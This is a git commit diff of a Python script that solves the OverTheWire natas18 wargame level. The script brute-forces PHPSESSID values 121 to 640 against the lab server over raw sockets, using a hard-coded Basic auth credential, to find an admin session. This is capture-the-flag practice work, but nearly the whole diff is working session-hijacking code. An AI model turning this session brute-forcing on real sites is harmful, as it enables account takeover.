1787bcc0907ea78f44123a364d3d925767e8a11e
akswnd98 <mjk4509@naver.com>
2017-03-08 21:49:20 +0900

    first

--- natas18/natas18.py
+++ natas18/natas18.py
@@ -1,9 +1,10 @@
 import socket
 
-send = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
-send.connect(("178.79.134.250", 80))
-for x in range(1, 641):
-    data = "GET /?index.php HTTP/1.1\r\n"
+string = ""
+for x in range(121, 641):
+    send = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
+    send.connect(("178.79.134.250", 80))
+    data = "GET / HTTP/1.1\r\n"
     data += "Host: natas18.natas.labs.overthewire.org\r\n"
     data += "Cookie: __cfduid=dd268278e25e6a2d33a5f0fcca5f072541488501913; __utma=176859643.273939219.1488501915.1488501915.1488501915.1; __utmz=176859643.1488501915.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); PHPSESSID=" + str(x) + "\r\n"
     data += "Authorization: Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==\r\n"
@@ -11,5 +12,13 @@ for x in range(1, 641):
     send.send(data.encode())
     recv = send.recv(1500)
     recv = recv.decode()
+    print(x)
     if "You are logged in as a regular user" not in recv:
-        print(x)
+        print(str(x) * 25)
+        string += recv
+        print(string)
+
+    else:
+        pass
+    
+    send.close()
